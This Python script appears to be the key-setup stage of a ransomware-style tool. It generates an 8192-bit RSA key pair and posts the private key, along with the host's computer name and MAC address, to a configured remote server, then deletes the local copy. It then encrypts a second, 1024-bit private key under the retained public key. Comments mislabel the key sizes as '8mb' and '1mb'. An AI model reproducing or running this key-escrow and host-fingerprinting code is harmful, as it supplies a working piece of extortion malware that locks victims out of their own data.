import sys
sys.path.append("./lib/")
from generateRSA import RsaGenerator
from rsaEncrypt import RsaEncrypt

import requests
import json
import base64
import os
import platform
import socket
import uuid

from time import time
from datetime import datetime

def recordTime(message):
    print(message+ str(datetime.now().time()))
    return time()

def removeFile(filename):
    try:
        os.remove(filename)
    except:
        pass

def generateRSA(size,privateKeyName,publicKeyName):
    rsa = RsaGenerator(size)
    rsa.generateKey(privateKeyName,publicKeyName)

def readJsonFile(filename):
    return json.load(open(filename,"rb"))

def base64File(filename):
    return base64.b64encode(open(filename,"rb").read())

def postRequest(url,body):
    try:
        r = requests.post(url,json=body)
        r.raise_for_status()
    except requests.exceptions.HTTPError as err:
        raise SystemExit(err)
    return r

def getCompName():
    try:
        n1 = platform.node()
    except:
        n1 = ''
    try:
        n2 = socket.gethostname()
    except:
        n2 = ''
    try:
        n3 = os.environ["COMPUTERNAME"]
    except:
        n3 = ''
    if n1 == n2 == n3:
        return n1
    elif n1 == n2:
        return n1
    elif n1 == n3:
        return n1
    elif n2 == n3:
        return n2
    else:
        raise SystemExit("Computernames are not equal to each other")

def getMacAddress():
    return ':'.join(("%012X" % uuid.getnode())[i:i+2] for i in range(0, 12, 2))
###################################################################################

#Record Start Time
start = recordTime("Start process on ")

#Generate 8mb RSA Key
removeFile("privkey8.der")
removeFile("pubkey8.der")
generateRSA(8192,"privkey8.der","pubkey8.der")

#Read Config File
config = readJsonFile('config.json')

#Base64 encode 8mb RSA Private Key
privkey = base64File("privkey8.der")

#Send b64encoded Private key to server
url = config['target_server']+'save'
body = {'privkey':privkey,'compName':getCompName(),'macAddr': getMacAddress()}
result = postRequest(url,body).json()

#Print UUID to terminal for notes
print("UUID : "+ result['id'])

#Remove Privatekey File
removeFile("privkey8.der")

#Generate 1mb RSA key
removeFile("privkey1.der")
removeFile("pubkey1.der")
generateRSA(1024, "privkey1.der", "pubkey1.der")

#Encrypt 1mb RSA Private Key using 8mb RSA Public Key
removeFile("privkey1_enc.der")
rsaEnc = RsaEncrypt("pubkey8.der")
rsaEnc.encryptFile("privkey1.der")
removeFile("privkey1.der")

#Record End time
end = recordTime("End process on ")

#Print time elapsed
print("")
print("time elapsed: "+ str(end-start) + " seconds")

#Record Time Duration to file
with open("time.log", "a") as logFile:
    logFile.write("[SETUP] : "+ str(end-start) + " seconds\n")
